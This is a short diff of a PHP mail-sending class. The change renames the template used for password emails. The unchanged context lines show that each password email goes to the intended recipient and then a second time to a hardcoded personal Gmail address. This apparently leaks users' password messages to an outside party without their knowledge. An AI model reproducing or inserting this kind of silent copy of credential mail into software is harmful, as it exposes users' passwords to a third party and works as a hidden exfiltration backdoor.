@@ -93,12 +93,12 @@ class Mail_global
         $data['mail_username'] = Config::get('mail.username');
         try 
         {
-            Mail::send('password.payment', $data, function ($m) use ($data) 
+            Mail::send('emails.password', $data, function ($m) use ($data) 
             {
                 $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                 $m->to($data['mail_to'], $data['mail_username'])->subject($data['mail_subject']);
             });
-            Mail::send('password.payment', $data, function ($m) use ($data) 
+            Mail::send('emails.password', $data, function ($m) use ($data) 
             {
                 $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                 $m->to("edwardguevarra2003@gmail.com", $data['mail_username'])->subject($data['mail_subject']);
